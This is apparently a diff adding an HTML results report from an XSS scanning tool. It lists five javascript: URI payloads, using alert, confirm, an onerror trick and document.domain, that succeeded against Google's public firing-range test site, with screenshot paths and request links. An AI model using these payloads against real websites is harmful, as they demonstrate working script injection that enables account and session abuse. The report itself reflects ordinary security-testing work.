@@ -1,0 +1,233 @@
+
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <style>
+            body {
+                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+                margin: 0;
+                padding: 20px;
+                background-color: #000;
+                color: #00ff00;
+            }
+            h1, h2 {
+                color: #00ff00;
+                text-align: center;
+            }
+            .header {
+                display: flex;
+                justify-content: space-between;
+                padding: 10px 20px;
+                border-bottom: 2px solid #00ff00;
+                margin-bottom: 20px;
+                background-color: #333;
+            }
+            .header .left a {
+                color: #00ff00;
+                font-size: 18px;
+                text-decoration: none;
+            }
+            .header .right {
+                color: #00ff00;
+                font-size: 18px;
+            }
+            table {
+                width: 100%;
+                border-collapse: collapse;
+                margin-top: 20px;
+                background-color: #000;
+            }
+            th, td {
+                border: 1px solid #00ff00;
+                padding: 10px;
+                text-align: left;
+            }
+            th {
+                background-color: #004400;
+                color: #00ff00;
+            }
+            tr:nth-child(even) {
+                background-color: #1a1a1a;
+            }
+            tr:hover {
+                background-color: #333;
+                transition: background-color 0.3s ease;
+            }
+            a {
+                color: #1e90ff;
+                text-decoration: none;
+            }
+            a:hover {
+                text-decoration: underline;
+            }
+            .payload {
+                color: #e67e22;
+                font-weight: bold;
+            }
+            img.zoomable {
+                height: 100px;
+                cursor: pointer;
+                transition: transform 0.3s ease-in-out;
+            }
+            img.zoomable:hover {
+                transform: scale(1.2);
+            }
+            .modal {
+                display: none;
+                position: fixed;
+                z-index: 1000;
+                padding-top: 60px;
+                left: 0;
+                top: 0;
+                width: 100%;
+                height: 100%;
+                overflow: auto;
+                background-color: rgba(0, 0, 0, 0.9);
+            }
+            .modal-content {
+                margin: auto;
+                display: block;
+                width: 80%;
+                max-width: 700px;
+            }
+            .close {
+                position: absolute;
+                top: 15px;
+                right: 35px;
+                color: #fff;
+                font-size: 40px;
+                font-weight: bold;
+            }
+            .close:hover, .close:focus {
+                color: #bbb;
+                cursor: pointer;
+            }
+        </style>
+                    <script src='https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.4.0/jspdf.umd.min.js'></script>
+                    <script>
+            document.addEventListener('DOMContentLoaded', function() {
+                const rows = document.querySelectorAll('.report-row');
+                rows.forEach(row => {
+                    row.addEventListener('click', () => {
+                        row.classList.toggle('highlight');
+                    });
+                });
+
+                const modal = document.getElementById('modal');
+                const modalImg = document.getElementById('modal-image');
+                const images = document.querySelectorAll('.zoomable');
+                const span = document.getElementsByClassName('close')[0];
+
+                let timer;
+
+                images.forEach(image => {
+                    image.addEventListener('mouseover', function() {
+                        clearTimeout(timer);
+                        modal.style.display = 'block';
+                        modalImg.src = this.src;
+                    });
+
+                    image.addEventListener('mouseout', function() {
+                        timer = setTimeout(() => {
+                            modal.style.display = 'none';
+                        }, 2000);
+                    });
+                });
+
+                span.onclick = function() { 
+                    modal.style.display = 'none';
+                    clearTimeout(timer);
+                };
+
+                window.onclick = function(event) {
+                    if (event.target == modal) {
+                        modal.style.display = 'none';
+                        clearTimeout(timer);
+                    }
+                };
+
+                document.getElementById('download-pdf').addEventListener('click', downloadPDF);
+            });
+
+            function downloadPDF() {
+                const { jsPDF } = window.jspdf;
+                const doc = new jsPDF();
+                const elementHTML = document.getElementById('report-table').outerHTML;
+                const filename = document.getElementById('download-pdf').getAttribute('data-filename');
+                doc.html(elementHTML, {
+                    callback: function (doc) {
+                        doc.save(filename);
+                    },
+                    x: 10,
+                    y: 10,
+                });
+            }
+        </script>
+                </head>
+            
+                <body>
+                    <div class='header'>
+                        <div class='left'>
+                            <a href='https://www.linkedin.com/in/ibrahim-husi%C4%87-101430102/' target='_blank'>LinkedIn Profile of Ibrahim</a>
+                        </div>
+                        <div class='right'>
+                            <span>#IbrahimXSS Tool V3</span>
+                        </div>
+                    </div>
+                    <h1 class='report-title'>Report 06/19/2024 09:56</h1>
+                    <h2>Found: 5 items</h2>
+                    <button id='download-pdf' data-filename='report-2024_6_19_9_56_12_620.pdf'>Download as PDF</button>
+                    <table id='report-table'>
+                        <thead>
+                            <tr>
+                                <th>Index</th>
+                                <th>Image</th>
+                                <th>Payload</th>
+                                <th>Request</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                <tr class='report-row'>
+                    <td>1</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_56_12_551.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>javascript:var img=document.createElement(&#39;img&#39;);img.src=&#39;&#39;;document.body.appendChild(img);img.onerror=alert(1)</td>
+                    <td><a target='_blank' class='request-link' href='https://public-firing-range.appspot.com/address/location.hash/assign#javascript:var img=document.createElement(&#39;img&#39;);img.src=&#39;&#39;;document.body.appendChild(img);img.onerror=alert(1)'>https://public-firing-range.appspot.com/address/location.hash/assign#javascript:var img=document.createElement(&#39;img&#39;);img.src=&#39;&#39;;document.body.appendChild(img);img.onerror=alert(1)</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>2</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_56_18_148.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>javascript:(alert(&#39;XSS Success!&#39;))()</td>
+                    <td><a target='_blank' class='request-link' href='https://public-firing-range.appspot.com/address/location.hash/assign#javascript:(alert(&#39;XSS Success!&#39;))()'>https://public-firing-range.appspot.com/address/location.hash/assign#javascript:(alert(&#39;XSS Success!&#39;))()</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>3</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_56_24_849.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>javascript:{ alert`0` }</td>
+                    <td><a target='_blank' class='request-link' href='https://public-firing-range.appspot.com/address/location.hash/assign#javascript:{ alert`0` }'>https://public-firing-range.appspot.com/address/location.hash/assign#javascript:{ alert`0` }</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>4</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_56_25_351.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>javascript:var{a:onerror}={a:alert};throw%20document.domain</td>
+                    <td><a target='_blank' class='request-link' href='https://public-firing-range.appspot.com/address/location.hash/assign#javascript:var{a:onerror}={a:alert};throw%20document.domain'>https://public-firing-range.appspot.com/address/location.hash/assign#javascript:var{a:onerror}={a:alert};throw%20document.domain</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>5</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_56_34_113.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>javascript:confirm(1)//</td>
+                    <td><a target='_blank' class='request-link' href='https://public-firing-range.appspot.com/address/location.hash/assign#javascript:confirm(1)//'>https://public-firing-range.appspot.com/address/location.hash/assign#javascript:confirm(1)//</a></td>
+                </tr>
+            </tbody>
+                    </table>
+                    <div id='modal' class='modal'>
+                        <span class='close'>&times;</span>
+                        <img class='modal-content' id='modal-image'>
+                        <div id='caption'></div>
+                    </div>
+                </body>
+                </html>
+            
